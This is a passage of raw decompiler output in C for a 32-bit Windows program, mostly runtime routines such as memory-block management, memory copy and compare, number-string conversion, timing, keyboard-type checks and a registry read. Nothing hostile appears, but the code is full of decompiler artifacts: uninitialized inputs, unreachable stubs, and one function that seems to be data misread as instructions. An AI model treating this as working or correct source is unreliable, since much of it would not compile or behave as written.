            int32_t v12 = v10; // 0x4022a4
            if ((*(char *)v8 & 2) == 0) {
                // 0x4022a6
                function_40199c();
                v12 = *(int32_t *)(v8 + 8) + v10;
            }
            // 0x4022b3
            v9 = v7;
            if (v12 >= 12) {
                // 0x4022b9
                *(int32_t *)(v3 + v5) = v12 | 2;
                function_401a60();
                v9 = v3;
            }
        } else {
            // 0x402267
            g73 = v11 - v10;
            int32_t v13 = g72; // 0x402273
            int32_t v14 = v13 + v10; // 0x402273
            g72 = v14;
            v9 = v3;
            if (v14 <= 11) {
                // 0x402286
                g73 = v11;
                g72 = v13;
                v9 = v7;
            }
        }
        goto lab_0x4023d2;
      lab_0x4023d2:
        // 0x4023d2
        g59 += v9 - v7;
        int32_t v15 = *v6; // 0x4023dc
        *v6 = v15 & -0x7ffffffd | v9;
        // 0x4023eb
        return v15 & -0x80000000 | 1;
    }
    uint32_t v16 = v3 - v7;
    if (v8 == g73) {
        // 0x4022eb
        if (g72 >= v16) {
            // break -> 0x4022f6
            break;
        }
        // 0x402349
        function_401c8c();
    }
    int32_t v17 = v8; // 0x402355
    uint32_t v18; // 0x40235b
    int32_t v19; // 0x402381
    int32_t v20; // 0x402398
    int32_t * v21; // 0x40239f
    if ((*(char *)v8 & 2) == 0) {
        // 0x402357
        v18 = *(int32_t *)(v8 + 8);
        if (v18 >= v16) {
            // 0x402378
            function_40199c();
            v19 = v18 - v16;
            if (v19 < 12) {
                // 0x402398
                v20 = v19 + v3;
                v21 = (int32_t *)(v20 + v5);
                *v21 = *v21 & -2;
                v9 = v20;
                goto lab_0x4023d2;
            } else {
                // 0x40238a
                function_401c04();
                v9 = v3;
                goto lab_0x4023d2;
            }
        }
        // 0x40236a
        v17 = v18 + v8;
    }
    while (*(int32_t *)v17 <= -1 && (char)function_401d90() != 0) {
        // 0x4022db
        if (v8 == g73) {
            // 0x4022eb
            if (g72 >= v16) {
                // break -> 0x4022f6
                break;
            }
            // 0x402349
            function_401c8c();
        }
        // 0x402352
        v17 = v8;
        if ((*(char *)v8 & 2) == 0) {
            // 0x402357
            v18 = *(int32_t *)(v8 + 8);
            if (v18 >= v16) {
                // 0x402378
                function_40199c();
                v19 = v18 - v16;
                if (v19 < 12) {
                    // 0x402398
                    v20 = v19 + v3;
                    v21 = (int32_t *)(v20 + v5);
                    *v21 = *v21 & -2;
                    v9 = v20;
                    goto lab_0x4023d2;
                } else {
                    // 0x40238a
                    function_401c04();
                    v9 = v3;
                    goto lab_0x4023d2;
                }
            }
            // 0x40236a
            v17 = v18 + v8;
        }
    }
    // 0x4023eb
    return 0;
}

// Address range: 0x4023f4 - 0x4024a5
int32_t function_4023f4(int32_t a1) {
    // 0x4023f4
    if (g62 == 0) {
        // 0x402408
        int32_t v1; // 0x4023f4
        if ((char)function_4017f8(v1) == 0) {
            int32_t result = function_4024ac(0, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111); // 0x402416
            return result;
        }
    }
    int32_t v2 = __readfsdword(0); // bp-32, 0x402423
    int32_t v3 = &v2; // 0x402423
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x402430
    if (g52 != 0) {
        struct _RTL_CRITICAL_SECTION * v5 = (struct _RTL_CRITICAL_SECTION *)&g64; // bp-36, 0x402432
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g64);
        v4 = (int32_t)&v5;
    }
    // 0x40243c
    if ((char)function_402218() == 0) {
        // 0x40244e
        if (function_401ee4() != 0) {
            // 0x402470
            function_4025bc();
            function_402074();
        }
    }
    // 0x402484
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x4024ac;
    int32_t result2 = 0; // 0x402498
    if (g52 != 0) {
        // 0x40249a
        *(int32_t *)(v4 + 4) = (int32_t)&g64;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g111);
        result2 = &g111;
    }
    // 0x4024a4
    return result2;
}

// Address range: 0x4024a5 - 0x4024aa
int32_t function_4024a5(void) {
    // 0x4024a5
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4024aa - 0x4024ac
int32_t function_4024aa(void) {
    // 0x4024aa
    int32_t result; // 0x4024aa
    return result;
}

// Address range: 0x4024ac - 0x4024b5
int32_t function_4024ac(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4024ac
    int32_t v1; // 0x4024ac
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x4024b8 - 0x4024d8
int32_t function_4024b8(void) {
    // 0x4024b8
    int32_t v1; // 0x4024b8
    if (v1 < 1) {
        // 0x4024d4
        return 0;
    }
    int32_t result = function_401ee4(); // 0x4024bd
    if (result != 0) {
        // 0x4024d4
        return result;
    }
    // 0x4024c9
    function_4025a0((int32_t)&g111);
    // UNREACHABLE
}

// Address range: 0x4024d8 - 0x4024f8
int32_t function_4024d8(void) {
    // 0x4024d8
    int32_t v1; // 0x4024d8
    if (v1 == 0 || function_402074() == 0) {
        // 0x4024f4
        return 0;
    }
    // 0x4024e9
    function_4025a0((int32_t)&g111);
    // UNREACHABLE
}

// Address range: 0x4024f8 - 0x402545
int32_t function_4024f8(void) {
    // 0x4024f8
    int32_t v1; // 0x4024f8
    int32_t v2; // 0x4024f8
    if (v2 == 0) {
        // 0x402530
        if (v1 == 0) {
            // 0x402528
            return 0;
        }
        // 0x402534
        if (function_401ee4() != 0) {
            // 0x402542
            abort();
            // UNREACHABLE
        }
        // 0x402529
        function_4025a0((int32_t)&g111);
        // UNREACHABLE
    }
    if (v1 == 0) {
        // 0x40251a
        *(int32_t *)v2 = 0;
        int32_t result = function_402074(); // 0x40251e
        if (result == 0) {
            // 0x402528
            return result;
        }
        // 0x402513
        function_4025a0((int32_t)&g111);
        // UNREACHABLE
    }
    int32_t result2 = function_4023f4(v2); // 0x402505
    if (result2 != 0) {
        // 0x402510
        *(int32_t *)v2 = result2;
        return result2;
    }
    // 0x402529
    function_4025a0((int32_t)&g111);
    // UNREACHABLE
}

// Address range: 0x402548 - 0x402553
int32_t function_402548(void) {
    // 0x402548
    function_403358();
    // UNREACHABLE
}

// Address range: 0x402553 - 0x402554
int32_t function_402553(void) {
    // 0x402553
    int32_t result; // 0x402553
    return result;
}

// Address range: 0x402554 - 0x40259b
int32_t function_402554(void) {
    // 0x402554
    int32_t v1; // 0x402554
    if ((v1 & 127) == 0) {
        // 0x402574
        function_404270();
    }
    // 0x402590
    function_402548();
    // UNREACHABLE
}

// Address range: 0x40259b - 0x40259e
int32_t function_40259b(int32_t a1, int32_t a2) {
    // 0x40259b
    int32_t result; // 0x40259b
    return result;
}

// Address range: 0x4025a0 - 0x4025ab
int32_t function_4025a0(int32_t a1) {
    // 0x4025a0
    return function_402554();
}

// Address range: 0x4025ab - 0x4025ac
int32_t function_4025ab(void) {
    // 0x4025ab
    int32_t result; // 0x4025ab
    return result;
}

// Address range: 0x4025ac - 0x4025bc
int32_t function_4025ac(int32_t a1, int32_t a2) {
    // 0x4025ac
    return function_404270();
}

// Address range: 0x4025bc - 0x4025fc
int32_t function_4025bc(void) {
    // 0x4025bc
    uint32_t v1; // 0x4025bc
    uint32_t result; // 0x4025bc
    uint32_t v2; // 0x4025bc
    if (v1 > v2) {
        if (result >= 0) {
            int32_t v3 = result - 4; // 0x4025db
            int32_t v4 = v3 + v1; // 0x4025df
            int32_t v5 = result / 4; // 0x4025e3
            __asm_rep_movsd_memcpy((char *)v4, (char *)(v3 + v2), v5);
            char * v6 = (char *)((-4 * v5 | 3) + v4); // 0x4025f6
            __asm_rep_movsb_memcpy(v6, v6, result & 3);
        }
        // 0x4025f9
        return result;
    }
    if (v1 == v2) {
        // 0x4025f9
        return result;
    }
    if (result < 0) {
        // 0x4025f9
        return result;
    }
    int32_t v7 = (int32_t)result / 4; // 0x4025ca
    __asm_rep_movsd_memcpy((char *)v1, (char *)v2, v7);
    bool v8; // 0x4025bc
    char * v9 = (char *)((v8 ? -4 : 4) * v7 + v1); // 0x4025d6
    __asm_rep_movsb_memcpy(v9, v9, result & 3);
    return result;
}

// Address range: 0x4025fc - 0x402621
int32_t function_4025fc(void) {
    // 0x4025fc
    int32_t lpPerformanceCount; // bp-8, 0x4025fc
    if (!QueryPerformanceCounter((struct _LARGE_INTEGER *)&lpPerformanceCount)) {
        int32_t result = GetTickCount(); // 0x402614
        g9 = result;
        return result;
    }
    int32_t result2 = &lpPerformanceCount; // 0x402609
    g9 = result2;
    return result2;
}

// Address range: 0x402624 - 0x402633
int32_t function_402624(void) {
    // 0x402624
    int32_t v1; // 0x402624
    *(int16_t *)&g13 = (int16_t)v1;
    return __asm_fnclex();
}

// Address range: 0x402634 - 0x40263b
int32_t function_402634(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x402634
    return 0;
}

// Address range: 0x40263c - 0x402692
int32_t function_40263c(void) {
    // 0x40263c
    int32_t v1; // 0x40263c
    int16_t v2 = *(int16_t *)(v1 + 4); // 0x402642
    int32_t result; // 0x40263c
    int32_t v3; // 0x40263c
    int32_t v4; // 0x40263c
    if (v2 < 0xd7b4) {
        int32_t v5 = (v2 & -0x284e) != -0x284e ? 0 : v1;
        int32_t v6 = v5 != 0 ? v5 : v1;
        result = 0;
        if (v6 != 0) {
            // 0x402672
            function_4025ac(v4, v3);
            result = v6;
        }
    } else {
        // 0x40267b
        result = 0;
        if (v1 != (int32_t)&g54) {
            // 0x402683
            function_4025ac(v4, v3);
            result = 0;
        }
    }
    // 0x40268d
    return result;
}

// Address range: 0x402694 - 0x4026af
int32_t function_402694(void) {
    // 0x402694
    int32_t v1; // 0x402694
    unsigned char v2 = (char)v1;
    int32_t v3; // 0x402694
    unsigned char v4 = (char)v3;
    int32_t v5; // 0x402694
    *(char *)v5 = v2 < v4 ? v2 : v4;
    return function_4025bc();
}

// Address range: 0x4026b0 - 0x40271f
int32_t function_4026b0(void) {
    // 0x4026b0
    uint32_t v1; // 0x4026b0
    int32_t v2 = (uint32_t)(v1 / 4); // 0x4026b8
    int32_t result; // 0x4026b0
    int32_t v3; // 0x4026b0
    if (v1 < 4) {
        goto lab_0x4026e0;
      lab_0x4026e0:;
        int32_t v4 = v1 & 3; // 0x4026e1
        if (v4 == 0 || *(char *)result != *(char *)v3) {
            // 0x402702
            return result;
        }
        int32_t v5 = v4 - 1; // 0x4026ec
        if (v5 == 0) {
            // 0x402702
            return 0;
        }
        // 0x4026ef
        if (*(char *)(result + 1) != *(char *)(v3 + 1)) {
            // 0x402702
            return result;
        }
        // 0x4026f7
        if (v5 == 1 || *(char *)(result + 2) == *(char *)(v3 + 2)) {
            // 0x402702
            return 0;
        }
        // 0x402702
        return result;
    }
    int32_t v6; // 0x4026b0
    int32_t v7 = v6;
    int32_t v8; // 0x4026b0
    int32_t result2 = v8;
    while (*(int32_t *)result2 == *(int32_t *)v7) {
        int32_t v9 = result2 + 4;
        if (v2 == 1) {
            // 0x4026da
            result = v9;
            v3 = v7 + 4;
            goto lab_0x4026e0;
        }
        // 0x4026c5
        if (*(int32_t *)v9 != *(int32_t *)(v7 + 4)) {
            // break -> 0x40271c
            break;
        }
        int32_t v10 = result2 + 8; // 0x4026cf
        int32_t v11 = v7 + 8; // 0x4026d2
        v2 -= 2;
        result = v10;
        v3 = v11;
        if (v2 == 0) {
            goto lab_0x4026e0;
        }
        v7 = v11;
        result2 = v10;
    }
    // 0x402702
    return result2;
}

// Address range: 0x402720 - 0x40273f
int32_t function_402720(void) {
    // 0x402720
    int32_t v1; // 0x402720
    int32_t v2 = 256 * v1 & 0xff00 | v1 & -0xff01; // 0x402723
    int32_t result = 0x10000 * v2 | v2 & 0xffff; // 0x40272a
    uint32_t v3; // 0x402720
    if (v3 >= 0) {
        int32_t v4 = v3 / 4; // 0x40272f
        int32_t v5; // 0x402720
        __asm_rep_stosd_memset((char *)v5, result, v4);
        bool v6; // 0x402720
        int32_t v7 = v6 ? -4 : 4; // 0x402734
        __asm_rep_stosb_memset((char *)(v7 * v4 + v5), (char)v1, v3 & 3);
    }
    // 0x40273d
    return result;
}

// Address range: 0x402740 - 0x40279f
int32_t function_402740(void) {
    // 0x402740
    int32_t v1; // bp-36, 0x402740
    int32_t v2 = &v1; // 0x402744
    int32_t v3 = 0;
    int32_t v4; // 0x402740
    uint32_t v5 = v4 < 0 ? -v4 : v4;
    int32_t v6 = v5 / 10; // 0x402759
    *(char *)(v3 + v2) = (char)(v5 % 10) | 48;
    int32_t v7 = v3 + 1; // 0x402761
    while (v5 >= 10) {
        // 0x402757
        v3 = v7;
        v5 = v6;
        v6 = v5 / 10;
        *(char *)(v3 + v2) = (char)(v5 % 10) | 48;
        v7 = v3 + 1;
    }
    int32_t v8 = v7; // 0x402768
    if (v4 < 0) {
        // 0x40276a
        *(char *)(v7 + v2) = 45;
        v8 = v3 + 2;
    }
    char v9 = v8; // 0x40276f
    int32_t v10; // 0x402740
    char * v11 = (char *)v10; // 0x40276f
    *v11 = v9;
    int32_t v12 = v10 + 1; // 0x402771
    int32_t v13; // 0x402740
    int32_t v14 = v13 < 255 ? v13 : 255;
    int32_t v15 = v6; // 0x402785
    int32_t v16 = v12; // 0x402785
    if (v14 > v8) {
        int32_t v17 = v14 - v8; // 0x402783
        *v11 = (char)v17 + v9;
        __asm_rep_stosb_memset((char *)v12, 32, v17);
        v15 = v6 & 0x1fffff00 | 32;
        bool v18; // 0x402740
        v16 = v17 * (v18 ? -1 : 1) + v12;
    }
    int32_t result = v15; // 0x40278e
    int32_t v19 = v8;
    int32_t v20 = v16; // 0x402740
    v19--;
    unsigned char v21 = *(char *)(v19 + v2); // 0x40278e
    result = result & -256 | (int32_t)v21;
    *(char *)v20 = v21;
    v20++;
    while (v19 != 0) {
        // 0x40278e
        v19--;
        v21 = *(char *)(v19 + v2);
        result = result & -256 | (int32_t)v21;
        *(char *)v20 = v21;
        v20++;
    }
    // 0x402798
    return result;
}

// Address range: 0x4027a0 - 0x4027aa
int32_t function_4027a0(int32_t a1, int32_t a2) {
    // 0x4027a0
    return function_402740();
}

// Address range: 0x4027ac - 0x40287d
int32_t function_4027ac(void) {
    // 0x4027ac
    int32_t v1; // 0x4027ac
    int32_t v2; // 0x4027ac
    int32_t v3; // 0x4027ac
    int32_t v4; // 0x4027ac
    int32_t v5; // 0x4027ac
    int32_t v6; // 0x4027ac
    int32_t v7; // 0x4027bf
    int32_t v8; // 0x4027c1
    if (v6 == 0) {
        goto lab_0x40282b;
    } else {
        while (true) {
          lab_0x4027bf:;
            // 0x4027bf
            int32_t v9; // 0x4027ac
            v4 = v9;
            unsigned char v10 = *(char *)v4; // 0x4027bf
            int32_t v11; // 0x4027ac
            v7 = v11 & -256;
            int32_t v12 = v7 | (int32_t)v10; // 0x4027bf
            v8 = v4 + 1;
            v11 = v12;
            v9 = v8;
            v2 = 0;
            v1 = v12;
            v5 = v8;
            v3 = 256;
            switch (v10) {
                case 32: {
                    goto lab_0x4027bf;
                }
                case 45: {
                    goto lab_0x402832;
                }
                case 43: {
                    // 0x402832
                    v3 = 0;
                    goto lab_0x402832;
                }
                default: {
                    goto lab_0x4027d3;
                }
            }
        }
    }
  lab_0x402818:;
    // 0x402818
    int32_t v13; // 0x4027ac
    int32_t result2; // 0x4027ac
    int32_t v14; // 0x4027ac
    if ((v2 & 0xff00) == 256) {
        int32_t result = -v13; // 0x402825
        if (v13 == 0 || result < 0) {
            // 0x402877
            *(int32_t *)v14 = 0;
            return result;
        }
    } else {
        // 0x40281c
        result2 = v13;
        if (v13 >= 0) {
          lab_0x402877:
            // 0x402877
            *(int32_t *)v14 = 0;
            return result2;
        }
    }
    goto lab_0x40282b;
  lab_0x402832:
    // 0x402832
    v2 = v3;
    v1 = v7 | (int32_t)*(char *)v8;
    v5 = v4 + 2;
    goto lab_0x4027d3;
  lab_0x4027d3:;
    char v38 = v1; // 0x4027d3
    int32_t v19 = v1; // 0x4027ac
    int32_t v16 = v5; // 0x4027ac
    int32_t v32; // 0x4027ac
    int32_t v30; // 0x4027ac
    switch (v38) {
        case 36: {
            goto lab_0x402837;
        }
        case 120: {
            goto lab_0x402837;
        }
        case 88: {
            goto lab_0x402837;
        }
        default: {
            if (v38 != 48) {
                // 0x4027fa
                v32 = v1;
                v30 = v5;
                if (v38 == 0) {
                    goto lab_0x40282b;
                } else {
                    goto lab_0x4027fe;
                }
            } else {
                unsigned char v39 = *(char *)v5; // 0x4027e7
                int32_t v40 = v1 & -256 | (int32_t)v39; // 0x4027e7
                int32_t v41 = v5 + 1; // 0x4027e9
                v32 = v40;
                v30 = v41;
                v13 = 0;
                v19 = v40;
                v16 = v41;
                switch (v39) {
                    case 120: {
                        goto lab_0x402837;
                    }
                    case 88: {
                        goto lab_0x402837;
                    }
                    case 0: {
                        goto lab_0x402818;
                    }
                    default: {
                        goto lab_0x4027fe;
                    }
                }
            }
        }
    }
  lab_0x402822:
    // 0x402822
    goto lab_0x40282b;
  lab_0x40282b:
    // 0x402877
    *(int32_t *)v14 = 1 - v6;
    return 0;
  lab_0x402837:;
    unsigned char v15 = *(char *)v16; // 0x40283c
    if (v15 == 0) {
        goto lab_0x402822;
    } else {
        int32_t v17 = v16 + 1;
        int32_t v18 = v19 & -256 | (int32_t)v15;
        int32_t v20 = 0;
        int32_t v21 = v18; // 0x402846
        if ((char)v18 >= 97) {
            // 0x402848
            v21 = v18 + 224 & 255 | v18 & -256;
        }
        int32_t v22 = v21;
        int32_t v23 = v22 + 208; // 0x40284b
        unsigned char v24 = (char)v23; // 0x40284e
        int32_t v25 = v23; // 0x402851
        if (v24 >= 10) {
            // 0x402853
            if (v24 >= 23) {
                // break -> 0x40282b
                break;
            }
            // 0x40285b
            v25 = v22 + 201;
        }
        // 0x40285e
        while (v20 <= 0xfffffff) {
            int32_t v26 = v22 & -256; // 0x40284b
            int32_t v27 = (v25 & 255 | v26) + 16 * v20; // 0x402865
            unsigned char v28 = *(char *)v17; // 0x402867
            if (v28 == 0) {
                // 0x40286e
                result2 = (v2 & 0xff00) != 256 ? v27 : -v27;
                goto lab_0x402877;
            }
            v17++;
            v18 = v26 | (int32_t)v28;
            v20 = v27;
            v21 = v18;
            if ((char)v18 >= 97) {
                // 0x402848
                v21 = v18 + 224 & 255 | v18 & -256;
            }
            // 0x40284b
            v22 = v21;
            v23 = v22 + 208;
            v24 = (char)v23;
            v25 = v23;
            if (v24 >= 10) {
                // 0x402853
                if (v24 >= 23) {
                    // break -> 0x40282b
                    break;
                }
                // 0x40285b
                v25 = v22 + 201;
            }
        }
        goto lab_0x40282b;
    }
  lab_0x4027fe:;
    int32_t v29 = v30;
    int32_t v31 = v32;
    int32_t v33 = 0;
    int32_t v34 = v31 + 208; // 0x4027fe
    while (v33 <= 0xccccccc && (char)v34 <= 9) {
        int32_t v35 = v31 & -256; // 0x4027fe
        int32_t v36 = (v34 & 255 | v35) + 10 * v33; // 0x40280f
        unsigned char v37 = *(char *)v29; // 0x402811
        v13 = v36;
        if (v37 == 0) {
            goto lab_0x402818;
        }
        v29++;
        v31 = v35 | (int32_t)v37;
        v33 = v36;
        v34 = v31 + 208;
    }
    goto lab_0x40282b;
}

// Address range: 0x402880 - 0x40288b
int32_t function_402880(void) {
    // 0x402880
    return function_40288c();
}

// Address range: 0x40288c - 0x4028af
int32_t function_40288c(void) {
    // 0x40288c
    uint32_t v1; // 0x40288c
    int32_t v2 = v1 < 255 ? v1 : 255; // 0x4028a5
    int32_t v3; // 0x40288c
    char v4 = *(char *)v3; // 0x40289b
    int32_t v5; // 0x40288c
    int32_t v6 = v5; // 0x4028a0
    while (v4 != 0) {
        int32_t v7 = v5 + 1; // 0x4028a2
        *(char *)v7 = v4;
        v2--;
        v5 = v7;
        v3++;
        v6 = v7;
        if (v2 == 0) {
            // break -> 0x4028a8
            break;
        }
        v4 = *(char *)v3;
        v6 = v5;
    }
    // 0x4028a8
    int32_t v8; // 0x40288c
    int32_t result = v6 - v8; // 0x4028a9
    *(char *)v8 = (char)result;
    return result;
}

// Address range: 0x4028b0 - 0x4028b6
int32_t function_4028b0(int32_t nTypeFlag) {
    // 0x4028b0
    return GetKeyboardType(nTypeFlag);
}

// Address range: 0x4028b8 - 0x4028e7
int32_t function_4028b8(void) {
    // 0x4028b8
    int32_t nTypeFlag; // 0x4028b8
    if (GetKeyboardType(nTypeFlag) != 7) {
        // 0x4028e3
        return 0;
    }
    int32_t v1 = GetKeyboardType(1) & 0xff00; // 0x4028ce
    return v1 == 1024 | v1 == 3328;
}

// Address range: 0x4028e8 - 0x40297f
int32_t function_4028e8(void) {
    uint16_t lpSubKey = *(int16_t *)&g13; // 0x4028ee
    int32_t ulOptions; // bp-8, 0x4028e8
    int32_t hKey; // 0x4028e8
    int32_t v1 = RegOpenKeyExA((int32_t *)hKey, (char *)(int32_t)lpSubKey, (int32_t)&ulOptions, 1, NULL); // 0x40290a
    if (v1 != 0) {
        uint16_t v2 = *(int16_t *)&g13 & -64 | lpSubKey & 63; // 0x402972
        *(int16_t *)&g13 = v2;
        return v1 & -0x10000 | (int32_t)v2;
    }
    int32_t v3 = __readfsdword(0); // bp-48, 0x40291b
    __writefsdword(0, (int32_t)&v3);
    RegQueryValueExA((int32_t *)4, (char *)&g111, &g111, &g111, (char *)&g111, &g111);
    __writefsdword(0, ulOptions);
    return RegCloseKey((int32_t *)ulOptions);
}

// Address range: 0x40297f - 0x402a62
int32_t function_40297f(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, int32_t a16, int32_t a17, int32_t a18) {
    int32_t v1 = a1;
    int32_t v2 = a6;
    int32_t v3; // 0x40297f
    char * v4 = (char *)(v3 + 79); // 0x40297f
    unsigned char v5 = *v4; // 0x40297f
    int32_t v6; // 0x40297f
    unsigned char v7 = v5 + (char)v6; // 0x40297f
    *v4 = v7;
    int32_t v8; // 0x40297f
    __asm_outsd((int16_t)v6 + 1, *(int32_t *)(v8 + 1));
    if (v7 < v5) {
        // 0x4029f9
        return function_402b40();
    }
    int16_t v9 = a16; // 0x40298e
    __asm_outsb(v9, (char)a18);
    int32_t v10; // 0x40297f
    *(char *)v10 = __asm_insb(v9);
    int64_t v11 = (int64_t)*(int32_t *)(a16 + 84 + 2 * a16); // 0x402996
    int32_t v12 = a7; // 0x4029a1
    int32_t result = a9; // 0x4029a1
    int32_t * v13 = &v2; // 0x4029a1
    int32_t v14 = a18; // 0x4029a1
    if (0x5046004c * v11 != 0x5046004c00000000 * v11 / 0x100000000) {
        // 0x4029a3
        v12 = v1;
        *(char *)a12 = __asm_insb((int16_t)a3);
        if (a18 == 1) {
            char * v15 = (char *)v12; // 0x4029a8
            *v15 = *v15 + 2 * (char)v12;
            return __asm_wait();
        }
        // 0x402a0d
        v1 = v2;
        result = a3;
        v13 = &v1;
        v14 = a12;
    }
    int32_t v16 = (int32_t)v13;
    int32_t v17 = v16 - 4; // 0x402a0e
    *(int32_t *)v17 = v14;
    *(int32_t *)result = v12;
    bool v18; // 0x40297f
    int32_t v19 = v18 ? -4 : 4; // 0x402a13
    int32_t v20 = result + v19; // 0x402a13
    uint32_t v21 = *(int32_t *)(v12 - 40); // 0x402a14
    int32_t * v22 = (int32_t *)(v16 - 8); // 0x402a19
    *v22 = v21;
    int32_t v23 = v21 / 4 - 1; // 0x402a1d
    __asm_rep_stosd_memset((char *)v20, 0, v23);
    __asm_rep_stosb_memset((char *)(v23 * v19 + v20), 0, *v22 & 3);
    int32_t v24 = *(int32_t *)(v12 - 72); // 0x402a2a
    int32_t v25 = v17; // 0x402a2f
    if (v24 != 0) {
        // 0x402a31
        v25 = v17 - 4;
        *(int32_t *)v25 = v24;
    }
    int32_t v26 = v25;
    int32_t v27 = *(int32_t *)(v12 - 36); // 0x402a32
    while (v27 != 0) {
        int32_t v28 = *(int32_t *)v27; // 0x402a39
        int32_t v29 = v26;
        v24 = *(int32_t *)(v28 - 72);
        v25 = v29;
        if (v24 != 0) {
            // 0x402a31
            v25 = v29 - 4;
            *(int32_t *)v25 = v24;
        }
        // 0x402a32
        v26 = v25;
        v27 = *(int32_t *)(v28 - 36);
    }
    // 0x402a3d
    if (v26 == v17) {
        // 0x402a5e
        return result;
    }
    int32_t v30 = v26; // 0x402a3f
    int32_t v31 = *(int32_t *)v30; // 0x402a41
    int32_t v32 = *(int32_t *)v31; // 0x402a44
    int32_t v33 = v31 + 4;
    int32_t v34 = *(int32_t *)(v33 + 16); // 0x402a47
    if (v34 != 0) {
        // 0x402a4e
        *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
    }
    // 0x402a54
    v32--;
    int32_t v35 = v33 + 28; // 0x402a58
    while (v32 != 0) {
        // 0x402a47
        v33 = v35;
        v34 = *(int32_t *)(v33 + 16);
        if (v34 != 0) {
            // 0x402a4e
            *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
        }
        // 0x402a54
        v32--;
        v35 = v33 + 28;
    }
    // 0x402a5a
    v30 += 4;
    while (v30 != v17) {
        // 0x402a41
        v31 = *(int32_t *)v30;
        v32 = *(int32_t *)v31;
        v33 = v31 + 4;
        v34 = *(int32_t *)(v33 + 16);
        if (v34 != 0) {
            // 0x402a4e
            *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
        }
        // 0x402a54
        v32--;
        v35 = v33 + 28;
        while (v32 != 0) {
            // 0x402a47
            v33 = v35;
            v34 = *(int32_t *)(v33 + 16);
            if (v34 != 0) {
                // 0x402a4e
                *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
            }
            // 0x402a54
            v32--;
            v35 = v33 + 28;
        }
        // 0x402a5a
        v30 += 4;
    }
    // 0x402a5e
    return result;
}

// Address range: 0x402a64 - 0x402a84
int32_t function_402a64(int32_t a1) {
    int32_t v1; // 0x402a64
    int32_t v2 = *(int32_t *)v1; // 0x402a6a
    int32_t v3 = *(int32_t *)(v2 - 36); // 0x402a6f
    if (*(int32_t *)(v2 - 64) != 0) {
        // 0x402a76
        function_403920();
    }
    // 0x402a64
    while (v3 != 0) {
        // 0x402a6a
        v2 = *(int32_t *)v3;
        v3 = *(int32_t *)(v2 - 36);
        if (*(int32_t *)(v2 - 64) != 0) {
            // 0x402a76
            function_403920();
        }
    }
    // 0x402a81
    int32_t result; // 0x402a64
    return result;
}

// Address range: 0x402a84 - 0x402ab2
int32_t function_402a84(int32_t a1, int32_t a2) {
    int32_t v1; // 0x402a84
    int32_t v2 = *(int32_t *)(v1 - 48); // 0x402a8a
    int32_t v3; // 0x402a84
    int32_t v4; // 0x402a84
    int32_t v5; // bp-4, 0x402a84
    int32_t result; // 0x402a84
    int32_t v6; // 0x402a95
    int32_t v7; // 0x402a98
    bool v8; // 0x402a84
    uint16_t v9; // 0x402a91
    int32_t v10; // 0x402a91
    if (v2 != 0) {
        // 0x402a91
        v9 = *(int16_t *)v2;
        v10 = v9;
        *(int32_t *)((int32_t)&v5 - 4) = v10;
        v6 = v2 + 2;
        v4 = v6;
        v3 = v10;
        if (v9 == 0) {
            // ._crit_edge
            if (v6 == 0) {
                // 0x402aa7
                return 2 * v10;
            }
        } else {
            v7 = v3 - 1;
            while (*(int16_t *)v4 != (int16_t)result) {
                // .lr.ph
                v4 += (v8 ? -2 : 2);
                if (v7 == 0) {
                    // break -> 0x402a9e
                    break;
                }
                v7--;
            }
            // 0x402aa7
            return 2 * v10 - v7;
        }
    }
    int32_t v11 = *(int32_t *)(v1 - 36); // 0x402a9e
    // 0x402a84
    while (v11 != 0) {
        // 0x402a88
        v1 = *(int32_t *)v11;
        v2 = *(int32_t *)(v1 - 48);
        if (v2 != 0) {
            // 0x402a91
            v9 = *(int16_t *)v2;
            v10 = v9;
            *(int32_t *)((int32_t)&v5 - 4) = v10;
            v6 = v2 + 2;
            v4 = v6;
            v3 = v10;
            if (v9 == 0) {
                // ._crit_edge
                if (v6 == 0) {
                    // 0x402aa7
                    return 2 * v10;
                }
            } else {
                v7 = v3 - 1;
                while (*(int16_t *)v4 != (int16_t)result) {
                    // .lr.ph
                    v4 += (v8 ? -2 : 2);
                    if (v7 == 0) {
                        // break -> 0x402a9e
                        break;
                    }
                    v7--;
                }
                // 0x402aa7
                return 2 * v10 - v7;
            }
        }
        // 0x402a9e
        v11 = *(int32_t *)(v1 - 36);
    }
    // 0x402aa5
    return result;
}

// Address range: 0x402ab4 - 0x402aba
int32_t function_402ab4(void) {
    // 0x402ab4
    return -0x7fff0001;
}

// Address range: 0x402abc - 0x402abd
int32_t function_402abc(void) {
    // 0x402abc
    int32_t result; // 0x402abc
    return result;
}

// Address range: 0x402ac0 - 0x402ac1
int32_t function_402ac0(void) {
    // 0x402ac0
    int32_t result; // 0x402ac0
    return result;
}

// Address range: 0x402ac4 - 0x402ac5
int32_t function_402ac4(void) {
    // 0x402ac4
    int32_t result; // 0x402ac4
    return result;
}

// Address range: 0x402ac8 - 0x402aee
int32_t function_402ac8(void) {
    // 0x402ac8
    int32_t v1; // 0x402ac8
    uint16_t v2 = (int16_t)v1;
    int32_t result; // 0x402ac8
    if (v2 != 0 && v2 < 0xc000) {
        // 0x402ad8
        int32_t v3; // 0x402ac8
        function_402a84(v3, result);
    }
    // 0x402ae3
    return result;
}

// Address range: 0x402aee - 0x402aef
int32_t function_402aee(void) {
    // 0x402aee
    int32_t result; // 0x402aee
    return result;
}

// Address range: 0x402af0 - 0x402b19
int32_t function_402af0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = __readfsdword(0); // 0x402b03
    __writefsdword(0, (int32_t)&v1);
    int32_t result; // 0x402af0
    return result;
}

